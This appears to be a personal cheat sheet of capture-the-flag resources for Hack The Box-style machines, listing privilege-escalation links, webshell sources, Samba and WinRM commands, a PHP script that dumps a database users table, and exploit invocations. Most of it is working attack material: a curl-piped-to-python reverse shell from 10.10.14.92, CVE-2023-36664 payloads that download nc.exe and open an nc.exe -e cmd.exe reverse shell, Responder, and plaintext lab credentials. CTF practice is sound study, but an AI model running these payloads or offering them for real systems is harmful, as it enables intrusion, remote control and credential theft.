# CTF gathered resources 

## PrivEsc

```
https://gtfobins.github.io/
```
## Commands

- `sudo -l`
- `puttygen keeper.ppk -O private-openssh -o keeper.pem` PPK to PEM
- `ansible2john ansible.vaul >> hashes`

## Webshells

- PHP webshell file upload feature - https://raw.githubusercontent.com/artyuum/simple-php-web-shell/master/index.php
- PHP webshell, multiple function exploit - https://github.com/flozz/p0wny-shell

## Python Shell

```
python2 handler.py -b 10.10.14.92:8888
# Run the reverse shell
curl 10.10.14.92:8000/shell.py|python3
```
## Kali

`/usr/share/windows-binaries/nc.exe`

## Samba

```
smbclient -L \\\\authority.htb\\
smbclient  \\\\authority.htb\\Development
```

## Windows

- `evil-winrm -i 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'` SSH for windows
-  `sudo responder -I tun0` Start some service

## PHP get DB

```php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
$sql = "SELECT * FROM users";

// Execute the query
$result = mysqli_query($link, $sql);
if ($result) {
    // Check if there are rows in the result set
    if (mysqli_num_rows($result) > 0) {
        // Output data of each row
        while ($row = mysqli_fetch_assoc($result)) {
            print_r($row); // You can customize this output based on your needs
            echo "<br>";
        }
    } else {
        echo "No records found";
    }

    // Free result set
    mysqli_free_result($result);
} else {
    echo "ERROR: Could not execute $sql. " . mysqli_error($link);
}

// Close connection
mysqli_close($link);
?>
```

## RoundCube

```
python3 CVE_2023_36664_exploit.py --generate --payload "curl 10.10.14.92:8000/nc.exe -o nc.exe" --filename first --extension eps
# execute shell
python3 CVE_2023_36664_exploit.py --generate --payload "nc.exe -e cmd.exe 10.10.14.92 6666" --filename second --extension eps
```
